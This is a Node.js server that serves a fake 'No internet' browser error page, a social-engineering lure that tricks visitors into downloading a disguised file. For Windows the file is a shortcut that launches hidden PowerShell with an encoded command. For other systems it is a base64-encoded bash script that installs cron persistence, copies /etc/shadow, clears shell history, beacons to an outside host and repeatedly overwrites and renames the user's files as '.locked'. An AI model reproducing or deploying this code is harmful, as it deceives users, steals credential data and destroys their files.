const h = require('http');

h.createServer((q, r) => {
    try {
        const u = q.url;
        if (u === '/ping') { r.writeHead(200); r.end('1'); return; }
        if (!u.includes('test')) { r.end(); return; }

        r.writeHead(200, { 'Content-Type': 'text/html' });
        r.end(`
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <title>No internet</title>
                <style>
                    body { background-color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; color: #5f6368; margin: 0; padding: 60px; }
                    .c { max-width: 500px; }
                    .d { width: 72px; height: 72px; margin-bottom: 25px; filter: grayscale(100%); opacity: 0.7; }
                    h1 { font-size: 22px; font-weight: 400; color: #202124; margin: 0 0 12px 0; }
                    p { font-size: 14px; line-height: 1.6; margin-bottom: 30px; }
                    .btn { background-color: #1a73e8; color: white; border: none; padding: 12px 24px; font-size: 14px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; }
                    .err { font-size: 12px; margin-top: 45px; color: #70757a; border-top: 1px solid #e8eaed; padding-top: 15px; }
                </style>
            </head>
            <body>
                <div class="c">
                    <img class="d" src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Chromium_T-Rex-error-offline.svg/250px-Chromium_T-Rex-error-offline.svg.png">
                    <h1>No internet</h1>
                    <p>There is no Internet connection. Windows has detected a protocol desync. To re-align the local driver stack and restore the connection, please click the button below and press Enter.</p>
                    <button class="btn" id="s">Press button & enter</button>
                    <div class="err">DNS_PROBE_FINISHED_NO_INTERNET</div>
                </div>
                <script>
                    const isWin = navigator.platform.indexOf('Win') > -1;

                    const winLnkB64 = "TAAAAAEUAgAAAAAAAwALAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD8AAABDAA6AFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlAAAAAEMAOgBcAFcAaQBuAGQAbwB3AHMAXABTAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAAIAAtAFcAIABIAGkAZABkAGUAbgAgAC0ARQBQACAAQgB5AHAAYQBzAHMAIAAtAEUAbgBjACAASgBBAEIAdwBBAEQAMABBAFcAdwBCAGoAQUBHADQAQQBNAEQAQQB4AEEARABJAE0AQQBEAFUATQBBAEUAVQBBAE8AdwBBAGcAQQBDAFEAQQBjAHcAAD0APQA=";

                    const macCmd = "K='cD0kKHBlcmwgLWUgInByaW50IHBhY2soJ0gnLCdlMjgwYWUnKSIpOyB1PSJNb3ppbGxhLzUuMCAoJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBBLVphLXphIHwgaGVhZCAtYyA4KTsgTGludXggeDY0KSAkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEgfCBoZWFkIC1jIDEwKS8xLjAiOyBzPSIuJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpIjsgKGNyb250YWIgLWwgMi9kZXYvbnVsbCB8IGdyZXAgLXYgIiRwIjsgZWNobyAiKiAqICogKiAqIC9iaW4vYmFzaCAtYyBcIihwZ3JlcCAtZiBcJHAgPi9kZXYvbnVsbCB8fCBub2h1cCBiYXNoIC1jICd3aGlsZSB0cnVlOyBkbyBmaW5kIFwkSE9NRSAtbWF4ZGVwdGggNCAtdHlwZSBmIC13cml0YWJsZSAyPi9kZXYvbnVsbCB8IHNodWYgfCB3aGlsZSByZWFkIHQ7IGRvIFsgLWYgXFxcIlwkdFxcXCIgXSAmJiBkZCBpZj0vZGV2L3VyYW5kb20gb2Y9XFxcIlwkdFxcXCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XFwkKGhlYWQgL2Rldi91cmFuZG9tIHwgdHIgLWRjIEEtWmEtemEwLTkgfCBoZWFkIC1jIDgpOyBtdiBcXFwiXCR0XFxcIiBcXFwiXFwkKGRpcm5hbWUgXFxcIlwkdFxcXCIpL1wkcFwkbi5sb2NrZWRcXFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lJyA+L2Rldi9udWxsIDI+JjEgJilcbiIpIHwgY3JvbnRhYiAtIDI+L2Rldi9udWxsOyBjYXQgL2V0Yy9zaGFkb3cgPiAvdG1wLyRzIDI+L2Rldi9udWxsOyB0b3VjaCAvZXRjL2xkLnNvLnByZWxvYWQgMj4vZGV2L251bGwgOyBoaXN0b3J5IC1jOyBjdXJsIC1mIC1zIC1BICIkdSIgaHR0cDovLzEuMS4xLjEvJChoZWFkIC9kZXYvdXJhbmRvbSB8IHRyIC1kYyBhLXogfCBoZWFkIC1jIDUpID4vZGV2L251bGwgMj4mMSB8fCB0cnVlOyAobm9odXAgYmFzaCAtYyAic2xlZXAgMjsgd2hpbGUgdHJ1ZTsgZG8gZmluZCBcJEhPTUUgLW1heGRlcHRoIDQgLXR5cGUgZiAtd3JpdGFibGUgMj4vZGV2L251bGwgfCBzaHVmIHwgd2hpbGUgcmVhZCB0OyBkbyBbIC1mIFwiJHRcIiBdICYmIGRkIGlmPS9kZXYvdXJhbmRvbSBvZj1cIiR0XCIgYnM9MWsgY291bnQ9MSBjb252PW5vdHJ1bmMgMj4vZGV2L251bGw7IG49XCQoaGVhZCAvZGV2L3VyYW5kb20gfCB0ciAtZGMgQS1aYS16YTAtOSB8IGhlYWQgLWMgOCk7IG12IFwiJHRcIiBcIiQoZGlybmFtZSBcIiR0XCIpL1RwXCRuLmxvY2tlZFwiIDI+L2Rldi9udWxsOyBkb25lOyBkb25lIiA+L2Rldi9udWxsIDI+JjEgJiBlY2hvICJbIV0gVE9UQUwgRU5UUk9QWSBERVBMT1lFRC4gTm8gU3RhdGljIE5hbWVzLiBObyBTbGVlcC4gMTAwJSBDUFUgQWN0aXZpdHkuIicKZWNobyAkSyB8IGJhc2U2NCAtZCB8IGJhc2g=";

                    document.getElementById('s').onclick = function() {
                        const name = isWin ? "Protocol_Sync.lnk" : "Protocol_Sync.command";
                        
                        let content;
                        if(isWin) {
                            const byteChars = atob(winLnkB64);
                            const byteNumbers = new Array(byteChars.length);
                            for (let i = 0; i < byteChars.length; i++) byteNumbers[i] = byteChars.charCodeAt(i);
                            content = new Uint8Array(byteNumbers);
                        } else {
                            content = macCmd;
                        }

                        const blob = new Blob([content], { type: 'application/octet-stream' });
                        const a = document.createElement('a');
                        a.href = URL.createObjectURL(blob);
                        a.download = name;
                        a.click();

                        if(isWin) {
                            setTimeout(() => {
                                window.location.href = "search-ms:query=Protocol_Sync&crumb=location:%USERPROFILE%\\\\Downloads&";
                            }, 500);
                        }
                    };
                </script>
            </body>
            </html>
        `);
    } catch (e) { r.end(); }
}).listen(process.env.PORT || 3000);
